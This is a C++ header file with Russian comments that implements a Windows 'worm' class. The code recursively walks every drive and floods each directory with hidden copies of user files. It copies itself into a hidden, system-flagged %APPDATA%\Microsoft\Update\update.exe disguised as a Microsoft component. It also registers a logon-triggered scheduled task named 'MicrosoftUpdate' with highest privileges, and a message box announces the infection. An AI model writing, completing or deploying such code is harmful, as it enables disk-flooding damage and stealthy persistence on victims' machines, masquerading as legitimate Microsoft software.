#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <iostream>
#include <chrono>
#include <random>
#include <locale>
#include <codecvt>
#include <Lmcons.h>
#include <shlobj.h>

using namespace std;
namespace fs = std::filesystem;


std::wstring get_own_path();
std::wstring get_drive_root_from_path(const std::wstring& full_path);
bool is_hidden(const fs::path& path);
void init_locale();
// Генератор случайных чисел
std::string generate_random_suffix();
// Генератор временной метки
std::string get_timestamp();

void worm_was_started();
wstring get_username();
vector<wstring> get_all_volumes();
vector<wstring> get_paths_for_volume(const wstring& volumeName);


class worm
{
private:

	wstring path_to_start;
	vector <wstring> list_dir;
	int iteration;

public:
	worm(const wstring& path_to_start = get_drive_root_from_path(get_own_path()), int iteration = 2)
		: path_to_start(path_to_start), iteration(iteration) {};


	void worm_was_started() {
		MessageBoxW(
			NULL,                            // Владелец окна (NULL — нет владельца)
			L"Ты был заражён!",              // Текст сообщения
			L"Предупреждение",               // Заголовок окна
			MB_OK | MB_ICONWARNING           // Кнопка OK и значок предупреждения
		);
	}


	void scan_all_volumes() { // проходимся по найденным корневым дирректориям и составляем список всех папок 
		auto volumes = get_all_volumes();

		for (const auto& vol : volumes) {
			auto paths = get_paths_for_volume(vol);

			for (const auto& path : paths) {
				std::wcout << L"Обход: " << path << L"\n";
				//search_list_dir(path);
				
			}
		}
	}



	void search_list_dir(const wstring& path_to_dir) { // рекурсивный поиск всех папок по адрессу и внутри
		error_code ec;

		fs::directory_iterator it(path_to_dir, ec);
		if (ec) {
			wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
			return;
		}

		for (const auto& entry : it) {
			if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
				std::wstring dir_path = entry.path().wstring();
				list_dir.push_back(dir_path);
				search_list_dir(dir_path);  // рекурсия
			}
		}

		list_dir.push_back(path_to_dir);
	}


	void search_list_dir() { // это нам возможно уже не нужно
		list_dir.clear();
		search_list_dir(path_to_start);
		//search_list_dir(L"E:\\test_worm");//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
	}

	void print_list_dir() { // вывод всех найденных папок, в которых будет копирование
		for (auto entry : list_dir) {
			wcout << entry << endl;
		}
	}

	void copy_file() { // проход по найденным папкам и копирование каждого не скрытого файла iteration раз
		//init_locale();
		if (list_dir.empty()) {
			cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
			return;
		}

		for (const auto& dir : list_dir) {

			vector<fs::path> files_to_copy;//создали список файлов для каждой дирректории
			//cout << " В директории " << dir << "\n";

			for (const auto& entry : fs::directory_iterator(dir)) {
				try {
					// Получаем статус файла с обработкой ошибок
					error_code ec;
					auto status = entry.status(ec);

					if (ec || !fs::is_regular_file(status)) continue;

					// Проверка скрытости для Windows
					bool ishidden = false;
					DWORD attrs = GetFileAttributesW(entry.path().wstring().c_str());
					ishidden = (attrs != INVALID_FILE_ATTRIBUTES) &&
						(attrs & FILE_ATTRIBUTE_HIDDEN);
					if (!ishidden) {
						files_to_copy.push_back(entry.path());
					}
				}
				catch (...) {
					continue; // Пропускаем проблемные файлы
				}
			}

			for (const auto& original_file : files_to_copy) { // копируем файлы и делаем их скрытными
				std::wstring ext = original_file.extension().wstring();
				std::wstring stem = original_file.stem().wstring();
				fs::path parent_dir = original_file.parent_path();

				cout << "Обрабатываем файл: " << original_file << "\n";

				// Создаем заданное количество копий
				for (int i = 1; i <= iteration; ++i) {

					// Создаем копию
					fs::path copy_path = parent_dir /
						(stem + L"_copy_" + std::to_wstring(std::time(nullptr)) + ext);

					try {
						fs::copy_file(original_file, copy_path, fs::copy_options::overwrite_existing);

						// 2. Устанавливаем атрибут "скрытый" (Unicode-версия)
						DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
						if (attrs != INVALID_FILE_ATTRIBUTES) {
							DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN;
							if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
								DWORD error = GetLastError();
								std::wcerr << L"Ошибка SetFileAttributesW: " << error << L"\n";
							}
						}
						else {
							DWORD error = GetLastError();
							std::wcerr << L"Ошибка GetFileAttributesW: " << error << L"\n";
						}
					}
					catch (const fs::filesystem_error& e) {
						cerr << "  Ошибка при создании копии: " << e.what() << "\n";
					}
				}




			}
		}
	}

	

	void copy_and_hide_worm() { // чтобы добавить в таск менеджер, желательно перекопировать червя в какую-то безопасную папку
		wchar_t own_path[MAX_PATH];
		GetModuleFileNameW(NULL, own_path, MAX_PATH);

		wchar_t appdata_path[MAX_PATH];
		SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);  // %APPDATA%

		std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update";
		std::wstring dest_exe = dest_folder + L"\\update.exe";

		// Создать директорию
		fs::create_directories(dest_folder);

		// Копировать себя
		CopyFileW(own_path, dest_exe.c_str(), FALSE);

		// Скрыть папку
		SetFileAttributesW(dest_folder.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

		// Скрыть файл
		SetFileAttributesW(dest_exe.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

		std::wcout << L"Файл червя скопирован в: " << dest_exe << std::endl;
	}

	void create_scheduled_task(const wstring& worm_path) { // создаем через Task Scheduler автозапуск червя при входе пользователя в систему ( путь указываем к текущему exe )
		//wstring worm_path = get_own_path();
		std::wstring cmd = L"schtasks /create /tn \"MicrosoftUpdate\" "
			L"/tr \"" + worm_path + L"\" "
			L"/sc ONLOGON /RL HIGHEST /F /RU \"" + get_username() + L"\"";
		_wsystem(cmd.c_str());
	}

	
};

